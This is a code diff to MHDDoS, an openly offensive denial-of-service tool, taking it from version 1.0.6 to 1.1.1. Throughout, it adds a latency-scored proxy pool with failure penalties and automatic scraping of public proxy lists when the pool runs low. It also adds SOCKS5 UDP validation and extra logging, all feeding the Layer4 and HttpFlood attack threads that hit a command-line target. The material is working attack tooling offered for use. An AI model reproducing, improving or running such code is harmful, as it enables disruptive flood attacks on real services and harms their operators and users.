@@ -1,7 +1,14 @@
 #!/usr/bin/env python3
 
+import logging
+import random
+import re
+import ssl
+import sys
+from base64 import b64encode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
+from datetime import datetime
 from itertools import cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
@@ -9,7 +16,6 @@ from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
-from re import compile
 from random import choice as randchoice, randint
 from socket import (
     AF_INET,
@@ -27,18 +33,19 @@ from socket import (
     socket,
 )
 from ssl import CERT_NONE, SSLContext, create_default_context
-import ssl
 from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
 from sys import exit as _exit
-import sys
-from threading import Event, Thread, Lock
+from threading import Event, Thread, Lock, RLock, current_thread
 from time import sleep, time
-from typing import Any, List, Set, Tuple, Optional, Union
+from typing import Any, List, Set, Tuple, Optional, Union, Dict
 from urllib import parse
+from urllib.parse import urlparse
 from uuid import UUID, uuid4
 
+import psutil
+import requests
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from certifi import where
@@ -49,25 +56,30 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, get, cookies
 from yarl import URL
-from base64 import b64encode
 
+# --- Tactical Configuration (v1.1.1) ---
+__version__: str = "1.1.1"
+__dir__: Path = Path(__file__).parent
+
+# Setup High-Signal Logging
 basicConfig(
     format="[%(asctime)s - %(levelname)s] %(message)s",
     datefmt="%H:%M:%S",
     stream=sys.stdout,
 )
 logger = getLogger("MHDDoS")
-logger.setLevel("INFO")
-for handler in logger.handlers:
-    handler.flush = sys.stdout.flush
+logger.setLevel(logging.INFO)
+
+# Silence library noise for maximum tactical focus
+logging.getLogger("urllib3").setLevel(logging.CRITICAL)
+logging.getLogger("requests").setLevel(logging.CRITICAL)
+
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
 
-__version__: str = "1.0.6"
-__dir__: Path = Path(__file__).parent
 __ip__: Any = None
 tor2webs = [
     "onion.city",
@@ -280,41 +292,231 @@ class HealthMonitor(Thread):
             sleep(self.interval)
 
 
-class ProxyPool:
-    def __init__(self, proxies: List[Proxy] = None):
-        self._proxies = proxies if proxies else []
-        self._lock = Lock()
-        self._index = 0
+class TacticalProxy:
+    def __init__(self, base_proxy: Proxy, latency_ms: float, is_protocol_verified: bool = False):
+        self.base = base_proxy
+        self.latency_ms = latency_ms
+        self.is_protocol_verified = is_protocol_verified
+        self.fail_count = 0
+        self.success_count = 0
+        self.score = self._calculate_initial_score()
 
-    def update_pool(self, new_proxies: List[Proxy]):
+    def _calculate_initial_score(self):
+        # Base score on latency: < 100ms = 90-100, 500ms = 50, 1000ms = 0
+        return max(1, 100 - (self.latency_ms / 10))
+
+    def update_score(self, current_failures: int):
+        # Penalty for failures: -10 points per failure recorded in this cycle
+        self.score = max(1, self._calculate_initial_score() - (current_failures * 15))
+
+    def __str__(self):
+        return self.base.__str__()
+
+    def open_socket(self, family=AF_INET, type=SOCK_STREAM, timeout=2):
+        return self.base.open_socket(family, type, timeout)
+
+
+class TacticalProxyValidator:
+    @staticmethod
+    def validate_and_score(raw_proxies: Set[Proxy], target_url: str = None, is_layer7: bool = True, is_udp: bool = False) -> List[TacticalProxy]:
+        tactical_proxies = []
+        total_raw = len(raw_proxies)
+        
+        if total_raw == 0:
+            return []
+
+        logger.info(
+            f"{bcolors.OKBLUE}[*] Resource: Tactical scoring initiated for {total_raw:,} assets...{bcolors.RESET}"
+        )
+
+        target_host = "8.8.8.8"
+        target_port = 53 if is_udp else 443
+        requires_ssl = False
+
+        if target_url and is_layer7:
+            from urllib.parse import urlparse
+            parsed = urlparse(target_url)
+            target_host = parsed.netloc or parsed.path
+            requires_ssl = parsed.scheme == "https"
+            target_port = 443 if requires_ssl else 80
+        elif target_url and not is_layer7:
+            if ":" in target_url:
+                target_host, target_port = target_url.split(":")
+                target_port = int(target_port)
+            else:
+                target_host = target_url
+
+        def _check(proxy: Proxy) -> TacticalProxy:
+            start_time = time()
+            try:
+                # 1. Connection Check
+                s = proxy.open_socket(timeout=3)
+                if not s: 
+                    return TacticalProxy(proxy, 2500.0, False)
+                
+                is_verified = False
+                # 2. SSL Handshake for L7 HTTPS
+                if requires_ssl and is_layer7:
+                    try:
+                        s.settimeout(3)
+                        s = ctx.wrap_socket(s, server_hostname=target_host, do_handshake_on_connect=True)
+                        is_verified = True
+                    except:
+                        with suppress(Exception): s.close()
+                        return TacticalProxy(proxy, 2000.0, False)
+                
+                # 3. UDP Associate Check for SOCKS5/UDP
+                elif is_udp and proxy.type == ProxyType.SOCKS5:
+                    try:
+                        s.settimeout(3)
+                        s.sendall(b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
+                        res = s.recv(10)
+                        if res and res[1] == 0x00:
+                            is_verified = True
+                        else:
+                            with suppress(Exception): s.close()
+                            return TacticalProxy(proxy, 2200.0, False)
+                    except:
+                        with suppress(Exception): s.close()
+                        return TacticalProxy(proxy, 2200.0, False)
+                else:
+                    is_verified = True
+
+                latency = (time() - start_time) * 1000
+                with suppress(Exception): s.close()
+                return TacticalProxy(proxy, latency, is_verified)
+            except:
+                return TacticalProxy(proxy, 3000.0, False)
+
+        max_workers = min(800, total_raw)
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = [executor.submit(_check, p) for p in raw_proxies]
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                    if result: tactical_proxies.append(result)
+                except: continue
+
+        elite_count = len([p for p in tactical_proxies if p.latency_ms < 1000])
+        logger.info(
+            f"{bcolors.OKGREEN}[*] Resource: Scoring complete. Elite-Tier: {elite_count:,} | Total Assets: {len(tactical_proxies):,} (Retained).{bcolors.RESET}"
+        )
+        
+        tactical_proxies.sort(key=lambda p: p.score, reverse=True)
+        return tactical_proxies
+
+
+class TacticalProxyPool:
+    def __init__(self, proxies: List[TacticalProxy] = None):
+        self._proxies = proxies if proxies else []
+        self._failures = {} # Map proxy string to failure count
+        self._lock = RLock()
+        self._weights = []
+        self._last_weight_update = 0
+        self._update_weights()
+
+    def report_failure(self, proxy_obj: Proxy):
+        p_str = str(proxy_obj)
+        with self._lock:
+            self._failures[p_str] = self._failures.get(p_str, 0) + 1
+
+    def _update_weights(self):
+        with self._lock:
+            if not self._proxies:
+                self._weights = []
+                return
+            for p in self._proxies:
+                p_str = str(p.base)
+                p.update_score(self._failures.get(p_str, 0))
+            self._weights = [p.score for p in self._proxies]
+            self._failures = {} 
+            self._last_weight_update = time()
+
+    def update_pool(self, new_proxies: List[TacticalProxy]):
         with self._lock:
             self._proxies = new_proxies
-            self._index = 0
-            if new_proxies:
+            self._failures = {}
+            self._update_weights()
+            if self._proxies:
+                avg_lat = sum(p.latency_ms for p in self._proxies[:50]) / min(50, len(self._proxies))
                 logger.info(
-                    f"{bcolors.OKGREEN}[*] Proxy Pool Atomic Update: {len(new_proxies):,} active resources loaded.{bcolors.RESET}"
-                )
-            else:
-                logger.warning(
-                    f"{bcolors.WARNING}[!] Proxy Pool Update: No proxies found. Continuing with empty pool.{bcolors.RESET}"
+                    f"{bcolors.OKGREEN}[*] Tactical Pool: {len(new_proxies):,} nodes active. Elite-Tier Latency: {avg_lat:.1f}ms{bcolors.RESET}"
                 )
 
     def get_proxy(self) -> Optional[Proxy]:
+        if time() - self._last_weight_update > 60:
+            self._update_weights()
         with self._lock:
-            if not self._proxies:
-                return None
-            proxy = self._proxies[self._index % len(self._proxies)]
-            self._index += 1
-            return proxy
+            if not self._proxies: return None
+            try:
+                selected = random.choices(self._proxies, weights=self._weights, k=1)[0]
+                return selected.base
+            except:
+                return self._proxies[0].base
 
     def __len__(self):
-        with self._lock:
-            return len(self._proxies)
+        with self._lock: return len(self._proxies)
+
+    def get_tactical_size(self):
+        return len(self)
+
+
+class AutonomousHarvester:
+    FALLBACK_APIS = [
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
+        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt"
+    ]
+
+    @staticmethod
+    def fromString(line: str) -> Optional[Proxy]:
+        line = line.strip()
+        if not line: return None
+        
+        # Robust parsing for Type://IP:PORT and IP:PORT formats
+        try:
+            if "://" in line:
+                return Proxy.fromString(line)
+            
+            # Default to SOCKS5 for raw IP:PORT if format unknown
+            import re
+            match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)", line)
+            if match:
+                ip, port = match.group(1), int(match.group(2))
+                return Proxy(ip, port, ProxyType.SOCKS5)
+        except: pass
+        return None
+
+    @staticmethod
+    def emergency_harvest(proxy_ty: int) -> Set[Proxy]:
+        logger.warning(f"{bcolors.FAIL}[!] EMERGENCY PROTOCOL: Autonomous Sourcing Activated. Initiating deep global scrape...{bcolors.RESET}")
+        proxies = set()
+        
+        def _fetch(url):
+            try:
+                res = get(url, timeout=10)
+                if res.status_code == 200:
+                    for line in res.text.splitlines():
+                        p = AutonomousHarvester.fromString(line)
+                        if p: proxies.add(p)
+            except: pass
+
+        with ThreadPoolExecutor(max_workers=len(AutonomousHarvester.FALLBACK_APIS)) as executor:
+            executor.map(_fetch, AutonomousHarvester.FALLBACK_APIS)
+            
+        logger.info(f"{bcolors.WARNING}[*] EMERGENCY PROTOCOL: Successfully recovered {len(proxies):,} raw assets from global fallback matrices.{bcolors.RESET}")
+        return proxies
 
 
 class ReloadSentinel(Thread):
     def __init__(
-        self, interval_mins: int, con, proxy_arg, proxy_ty, pool: ProxyPool, url=None
+        self, interval_mins: int, con, proxy_arg, proxy_ty, pool: TacticalProxyPool, url=None
     ):
         Thread.__init__(self, daemon=True)
         self.interval = interval_mins * 60
@@ -330,6 +532,16 @@ class ReloadSentinel(Thread):
 
         while True:
             sleep(self.interval)
+            
+            # Check if pool is critically low
+            if self.pool.get_tactical_size() < 10:
+                logger.warning(f"{bcolors.FAIL}[!] Sentinel Alert: Tactical Pool Depleted ({self.pool.get_tactical_size()} active). Executing Emergency Sourcing.{bcolors.RESET}")
+                raw_emergency = AutonomousHarvester.emergency_harvest(self.proxy_ty)
+                if raw_emergency:
+                    scored_emergency = TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None)
+                    self.pool.update_pool(scored_emergency)
+                    continue
+
             logger.info(
                 f"{bcolors.OKCYAN}[*] Sentinel: Periodic proxy refresh initiated...{bcolors.RESET}"
             )
@@ -337,7 +549,14 @@ class ReloadSentinel(Thread):
                 new_proxies = handleProxyList(
                     self.con, self.proxy_arg, self.proxy_ty, self.url
                 )
-                self.pool.update_pool(list(new_proxies) if new_proxies else [])
+                if new_proxies:
+                    # In handleProxyList we return normal Proxies if from file/url directly.
+                    # We need to ensure they are scored here if they aren't already.
+                    if isinstance(new_proxies, list) and len(new_proxies) > 0 and isinstance(new_proxies[0], TacticalProxy):
+                        self.pool.update_pool(new_proxies)
+                    else:
+                        scored = TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None)
+                        self.pool.update_pool(scored)
             except Exception as e:
                 logger.error(
                     f"{bcolors.FAIL}[!] Sentinel Error during refresh: {e}{bcolors.RESET}"
@@ -345,8 +564,8 @@ class ReloadSentinel(Thread):
 
 
 class Tools:
-    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
-    protocolRex = compile('"protocol":(\\d+)')
+    IP = re.compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
+    protocolRex = re.compile('"protocol":(\\d+)')
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -619,7 +838,7 @@ class Layer4(Thread):
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
-    _proxy_pool: ProxyPool = None
+    _proxy_pool: TacticalProxyPool = None
 
     def __init__(
         self,
@@ -627,7 +846,7 @@ class Layer4(Thread):
         ref: List[str] = None,
         method: str = "TCP",
         synevent: Event = None,
-        proxy_pool: ProxyPool = None,
+        proxy_pool: TacticalProxyPool = None,
         protocolid: int = 74,
     ):
         Thread.__init__(self, daemon=True)
@@ -664,17 +883,27 @@ class Layer4(Thread):
     def open_connection(
         self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP
     ):
+        proxy = None
         if self._proxy_pool:
             proxy = self._proxy_pool.get_proxy()
             if proxy:
-                s = proxy.open_socket(conn_type, sock_type, proto_type)
+                try:
+                    s = proxy.open_socket(conn_type, sock_type, proto_type)
+                except Exception:
+                    self._proxy_pool.report_failure(proxy)
+                    raise
             else:
                 s = socket(conn_type, sock_type, proto_type)
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         s.settimeout(0.9)
-        s.connect(self._target)
+        try:
+            s.connect(self._target)
+        except Exception:
+            if proxy and self._proxy_pool:
+                self._proxy_pool.report_failure(proxy)
+            raise
         return s
 
     def TCP(self) -> None:
@@ -943,7 +1172,7 @@ class Layer4(Thread):
 
 
 class HttpFlood(Thread):
-    _proxy_pool: ProxyPool = None
+    _proxy_pool: TacticalProxyPool = None
     _payload: str
     _defaultpayload: Any
     _req_type: str
@@ -965,7 +1194,7 @@ class HttpFlood(Thread):
         synevent: Event = None,
         useragents: Set[str] = None,
         referers: Set[str] = None,
-        proxy_pool: ProxyPool = None,
+        proxy_pool: TacticalProxyPool = None,
     ) -> None:
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
@@ -1926,94 +2155,100 @@ class ToolsConsole:
 def handleProxyList(con, proxy_arg, proxy_ty, url=None):
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
+    
     if proxy_ty == 6:
         proxy_ty = randchoice([4, 5, 1])
+        
     proxies = set()
-    if str(proxy_arg).startswith("http://") or str(proxy_arg).startswith("https://"):
-        logger.info(
-            f"{bcolors.WARNING}[*] Resource: Streaming proxies from {bcolors.OKBLUE}{proxy_arg}{bcolors.RESET}"
-        )
+    is_remote = str(proxy_arg).startswith(("http://", "https://"))
+    
+    if is_remote:
+        logger.info(f"{bcolors.WARNING}[*] Resource: Synchronizing remote tactical assets from {bcolors.OKBLUE}{proxy_arg}{bcolors.RESET}")
         try:
-            data = get(str(proxy_arg), timeout=10).text
+            res = get(str(proxy_arg), timeout=15)
+            if res.status_code != 200:
+                raise Exception(f"HTTP {res.status_code}")
+            
+            data = res.text
             if proxy_ty == 0:
                 for line in data.splitlines():
                     p = Proxy.fromString(line.strip())
-                    if p:
-                        proxies.add(p)
+                    if p: proxies.add(p)
             else:
-                import re
-
                 proxy_type_obj = ProxyType.stringToProxyType(str(proxy_ty))
-                ip_port_pattern = re.compile(
-                    r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)"
-                )
-                for line in data.splitlines():
-                    match = ip_port_pattern.search(line)
-                    if match:
-                        ip, port = match.group(1).split(":")
-                        proxy = Proxy(ip, int(port), proxy_type_obj)
-                        proxies.add(proxy)
+                # Efficient Regex Parsing
+                ip_port_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)")
+                for match in ip_port_pattern.finditer(data):
+                    proxies.add(Proxy(match.group(1), int(match.group(2)), proxy_type_obj))
+            
             if not proxies:
-                logger.warning(
-                    f"{bcolors.WARNING}[!] Resource: No active resources found at origin.{bcolors.RESET}"
-                )
+                logger.warning(f"{bcolors.WARNING}[!] Resource: Tactical failure - No active resources found at origin.{bcolors.RESET}")
             else:
-                logger.info(
-                    f"{bcolors.OKGREEN}[*] Resource: {len(proxies):,} active endpoints synchronized.{bcolors.RESET}"
-                )
+                logger.info(f"{bcolors.OKGREEN}[*] Resource: Deployment successful. {len(proxies):,} active endpoints synchronized.{bcolors.RESET}")
             sys.stdout.flush()
         except Exception as e:
             logger.error(f"[!] Handshake Failed: {e}")
             sys.stdout.flush()
-            if "ReloadSentinel" not in Thread.current_thread().name:
+            if "ReloadSentinel" not in current_thread().name:
                 exit(f"Origin Unreachable: {e}")
             return set()
     else:
-        proxy_li = proxy_arg
-        if not proxy_li.exists():
+        proxy_li = Path(proxy_arg)
+        is_sentinel = "ReloadSentinel" in current_thread().name
+        force_harvest = proxy_li.name == "auto_harvest.txt"
+        
+        if not proxy_li.exists() or force_harvest:
             if proxy_li.name == "auto_harvest.txt":
-                logger.warning(
-                    f"{bcolors.WARNING}[*] Auto-Harvest: Scraping and validating proxies. This may take a moment...{bcolors.RESET}"
-                )
+                action_type = "Refreshing" if is_sentinel else "Scraping"
+                logger.info(f"{bcolors.OKCYAN}[*] Auto-Harvest: {action_type} global tactical matrices. Please stand by...{bcolors.RESET}")
             else:
-                logger.warning(
-                    f"{bcolors.WARNING}[!] Resource: Local asset missing. Initializing fallback download.{bcolors.RESET}"
-                )
+                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset missing. Initializing emergency fallback sequence.{bcolors.RESET}")
+            
             proxy_li.parent.mkdir(parents=True, exist_ok=True)
-            with proxy_li.open("w") as wr:
-                Proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
-                logger.info(
-                    f"{bcolors.OKBLUE}[*] Resource: Validating {len(Proxies):,} proxy assets...{bcolors.RESET}"
-                )
-                Proxies = ProxyChecker.checkAll(
-                    Proxies,
-                    timeout=3,
-                    threads=500,
-                    url=url.human_repr() if url else "http://httpbin.org/get",
-                )
-                if not Proxies:
-                    exit("Resource Validation Failed. Check network uplink.")
-                stringBuilder = ""
-                for proxy in Proxies:
-                    stringBuilder += proxy.__str__() + "\n"
-                wr.write(stringBuilder)
-        if not str(proxy_arg).startswith("http"):
+            all_raw_proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
+            
+            if not all_raw_proxies:
+                if is_sentinel: return set()
+                exit("Tactical Matrix Depleted. Check uplink.")
+                
+            total_found = len(all_raw_proxies)
+            logger.info(f"{bcolors.OKBLUE}[*] Resource: Validation protocol initiated for {total_found:,} raw tactical assets...{bcolors.RESET}")
+            
+            # Use PyRoxy for checking
+            validated_proxies = ProxyChecker.checkAll(
+                all_raw_proxies,
+                timeout=3,
+                threads=min(500, total_found),
+                url=url.human_repr() if url else "http://httpbin.org/get",
+            )
+            
+            if not validated_proxies:
+                if is_sentinel:
+                    logger.error(f"{bcolors.FAIL}[!] Sentinel: Harvest failed. Retaining current tactical pool.{bcolors.RESET}")
+                    return ProxyUtiles.readFromFile(proxy_li)
+                exit("Resource Validation Failed. Tactical assets purged - check uplink.")
+            
+            efficiency = round(len(validated_proxies) / total_found * 100, 1) if total_found > 0 else 0
+            logger.info(f"{bcolors.OKGREEN}[*] Resource: Validation complete. Usable: {len(validated_proxies):,} / Total: {total_found:,} ({efficiency}% efficiency).{bcolors.RESET}")
+            
+            with proxy_li.open("w", encoding="utf-8") as wr:
+                wr.write("\n".join(str(p) for p in validated_proxies))
+            
+            proxies = validated_proxies
+        else:
             proxies = ProxyUtiles.readFromFile(proxy_li)
             if proxies:
-                logger.info(
-                    f"{bcolors.OKGREEN}[*] Resource: {len(proxies):,} local endpoints active.{bcolors.RESET}"
-                )
+                logger.info(f"{bcolors.OKGREEN}[*] Resource: {len(proxies):,} local endpoints active.{bcolors.RESET}")
             else:
-                logger.info(
-                    f"{bcolors.WARNING}[!] Resource: Local asset pool empty. Continuing without resources.{bcolors.RESET}"
-                )
-                proxies = None
+                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset pool empty. Tactical profile limited.{bcolors.RESET}")
+                
     return proxies
+
 
 
 if __name__ == "__main__":
     with suppress(KeyboardInterrupt):
-        with suppress(IndexError, ValueError):
+        try:
             one = argv[1].upper()
             if one == "HELP":
                 raise IndexError()
@@ -2021,7 +2256,7 @@ if __name__ == "__main__":
                 ToolsConsole.runConsole()
             if one == "STOP":
                 ToolsConsole.stop()
-            method, event, proxy_pool, refresh_mins = one, Event(), ProxyPool(), 0
+            method, event, proxy_pool, refresh_mins = one, Event(), TacticalProxyPool(), 0
             event.clear()
             urlraw = argv[2].strip()
             if not urlraw.startswith("http"):
@@ -2074,11 +2309,19 @@ if __name__ == "__main__":
                 if not uagents or not referers:
                     exit("Critical Assets Empty")
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
-                proxy_pool.update_pool(list(proxies) if proxies else [])
+                if proxies:
+                    tactical_proxies = TacticalProxyValidator.validate_and_score(set(proxies), str(url) if url else None, is_layer7=True)
+                    proxy_pool.update_pool(tactical_proxies)
+                else:
+                    proxy_pool.update_pool([])
+                
                 if refresh_mins > 0:
+                    logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                     ReloadSentinel(
                         refresh_mins, con, proxy_li, proxy_ty, proxy_pool, url
                     ).start()
+                
+                logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L7 worker threads...{bcolors.RESET}")
                 for thread_id in range(threads):
                     HttpFlood(
                         thread_id,
@@ -2153,11 +2396,18 @@ if __name__ == "__main__":
                                 else Path(__dir__ / "files/proxies" / proxy_arg)
                             )
                             proxies = handleProxyList(con, proxy_li, proxy_ty)
-                            proxy_pool.update_pool(list(proxies) if proxies else [])
+                            if proxies:
+                                tactical_proxies = TacticalProxyValidator.validate_and_score(set(proxies), is_layer7=False)
+                                proxy_pool.update_pool(tactical_proxies)
+                            else:
+                                proxy_pool.update_pool([])
+                            
                             if refresh_mins > 0:
+                                logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                                 ReloadSentinel(
                                     refresh_mins, con, proxy_li, proxy_ty, proxy_pool
                                 ).start()
+                            
                             if method not in {
                                 "MINECRAFT",
                                 "MCBOT",
@@ -2179,6 +2429,8 @@ if __name__ == "__main__":
                         )
                         if 47 < protocolid > 758:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
+                
+                logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 worker threads...{bcolors.RESET}")
                 for _ in range(threads):
                     Layer4(
                         (host, port), ref, method, event, proxy_pool, protocolid
@@ -2219,4 +2471,11 @@ if __name__ == "__main__":
                 sleep(1)
             event.clear()
             exit()
-        ToolsConsole.usage()
+        except (IndexError, ValueError):
+            ToolsConsole.usage()
+        except Exception as e:
+            import traceback
+            logger.error(f"{bcolors.FAIL}[!] ENGINE_CRASH: Critical Failure during deployment.{bcolors.RESET}")
+            logger.error(f"{bcolors.FAIL}[!] ERROR_DETAILS: {str(e)}{bcolors.RESET}")
+            logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
+            exit()
